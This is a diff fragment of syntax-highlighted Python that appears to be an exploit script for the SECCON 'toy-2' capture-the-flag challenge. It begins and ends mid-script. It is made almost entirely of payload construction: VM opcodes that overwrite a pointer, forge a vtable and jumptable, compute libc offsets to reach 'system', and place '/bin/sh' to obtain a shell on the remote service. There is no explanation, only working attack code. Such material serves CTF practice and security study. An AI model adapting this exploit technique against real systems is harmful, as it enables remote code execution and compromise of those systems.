+</span></span><span style="display:flex;"><span>p <span style="color:#ff7b72;font-weight:bold">=</span> remote(<span style="color:#a5d6ff">&#34;toy-2.seccon.games&#34;</span>, <span style="color:#a5d6ff">5000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## overwrite ptr </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x2</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x8</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># user data</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16((<span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A</span><span style="color:#79c0ff">\xd8</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x6</span>) <span style="color:#8b949e;font-style:italic"># 0x8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## padding and jump after move backward</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">11</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x30</span>) <span style="color:#8b949e;font-style:italic"># 0x2e</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x50</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## set length and corrupt ptr</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x12</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1c</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># user data</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfe8</span>) <span style="color:#8b949e;font-style:italic"># 0x14</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x8000</span>) <span style="color:#8b949e;font-style:italic"># 0x16</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfdf</span>) <span style="color:#8b949e;font-style:italic"># 0x18</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A</span><span style="color:#79c0ff">\xb0</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#8b949e;font-style:italic"># 0x1a</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x16</span>) <span style="color:#8b949e;font-style:italic"># 0x1c</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x14</span>) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x1a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x18</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## craft jumptable</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x56</span>) <span style="color:#8b949e;font-style:italic"># 0x54</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x6e</span>) <span style="color:#8b949e;font-style:italic"># 0x56</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1008</span>) <span style="color:#8b949e;font-style:italic"># 0x58 # heap</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x100a</span>) <span style="color:#8b949e;font-style:italic"># 0x5a</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x100c</span>) <span style="color:#8b949e;font-style:italic"># 0x5c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x0</span>) <span style="color:#8b949e;font-style:italic"># 0x5e # vtable</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x2</span>) <span style="color:#8b949e;font-style:italic"># 0x60</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4</span>) <span style="color:#8b949e;font-style:italic"># 0x62</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4000</span>) <span style="color:#8b949e;font-style:italic"># 0x64 # target</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4002</span>) <span style="color:#8b949e;font-style:italic"># 0x66</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4004</span>) <span style="color:#8b949e;font-style:italic"># 0x68</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x2020</span>) <span style="color:#8b949e;font-style:italic"># 0x6a # off _start</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x3ff8</span>) <span style="color:#8b949e;font-style:italic"># 0x6c # off heap</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0x0</span>) <span style="color:#8b949e;font-style:italic"># 0x6e</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x6a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x64</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x2</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x66</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x68</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0x58</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldi()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _adc(<span style="color:#a5d6ff">0x6c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x5e</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x5a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldi()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x60</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x5c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldi()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x62</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ill()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## continue stage 2 payload</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x100</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x174</span>) <span style="color:#8b949e;font-style:italic"># 0x172</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1b2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xf78</span>) <span style="color:#8b949e;font-style:italic"># 0x176 # libc</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xf7a</span>) <span style="color:#8b949e;font-style:italic"># 0x178</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xf7c</span>) <span style="color:#8b949e;font-style:italic"># 0x17a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfd8</span>) <span style="color:#8b949e;font-style:italic"># 0x17c # vtable</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfda</span>) <span style="color:#8b949e;font-style:italic"># 0x17e</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfdc</span>) <span style="color:#8b949e;font-style:italic"># 0x180</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4000</span>) <span style="color:#8b949e;font-style:italic"># 0x182 # target</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4002</span>) <span style="color:#8b949e;font-style:italic"># 0x184</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4004</span>) <span style="color:#8b949e;font-style:italic"># 0x186</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># mov rdi, r13 ; call qword ptr [rax + 0x48]</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x14</span>) <span style="color:#8b949e;font-style:italic"># 0x188 # off2</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x61c9</span>) <span style="color:#8b949e;font-style:italic"># 0x18a # off1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4130</span>) <span style="color:#8b949e;font-style:italic"># 0x18c # off heap</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4040</span>) <span style="color:#8b949e;font-style:italic"># 0x18e # target</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4042</span>) <span style="color:#8b949e;font-style:italic"># 0x190</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4044</span>) <span style="color:#8b949e;font-style:italic"># 0x192</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x45</span>) <span style="color:#8b949e;font-style:italic"># 0x194 # off2 system</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x68b0</span>) <span style="color:#8b949e;font-style:italic"># 0x196 # off1 system</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x3ff8</span>) <span style="color:#8b949e;font-style:italic"># 0x198 # target</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x3ffa</span>) <span style="color:#8b949e;font-style:italic"># 0x19a</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x3ffc</span>) <span style="color:#8b949e;font-style:italic"># 0x19c</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x3ffe</span>) <span style="color:#8b949e;font-style:italic"># 0x19e</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;/b&#34;</span> <span style="color:#8b949e;font-style:italic"># 0x1a0</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;in&#34;</span> <span style="color:#8b949e;font-style:italic"># 0x1a2</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;/s&#34;</span> <span style="color:#8b949e;font-style:italic"># 0x1a4</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;h</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#8b949e;font-style:italic"># 0x1a6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># mov r13, rax ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x40]</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1b</span>) <span style="color:#8b949e;font-style:italic"># 0x1a8 # off2 </span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x7024</span>) <span style="color:#8b949e;font-style:italic"># 0x1aa # off1 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4038</span>) <span style="color:#8b949e;font-style:italic"># 0x1ac # target</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x403a</span>) <span style="color:#8b949e;font-style:italic"># 0x1ae</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x403c</span>) <span style="color:#8b949e;font-style:italic"># 0x1b0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0xf78</span>) <span style="color:#8b949e;font-style:italic"># 0x1b2</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x18a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x182</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0xf7a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x188</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x184</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0xf7c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x186</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0xf78</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x196</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x18e</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0xf7a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x194</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x190</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0xf7c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x192</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0xf78</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x1aa</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x1ac</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0xf7a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x1a8</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x1ae</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0xf7c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x1b0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0xed0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _adc(<span style="color:#a5d6ff">0x18c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x17c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0xed2</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x17e</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0xed4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x180</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0x1a0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x198</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x1a2</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x19a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x1a4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x19c</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x1a6</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x19e</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">while</span>(len(payload) <span style="color:#ff7b72;font-weight:bold">&lt;</span> (<span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>)):
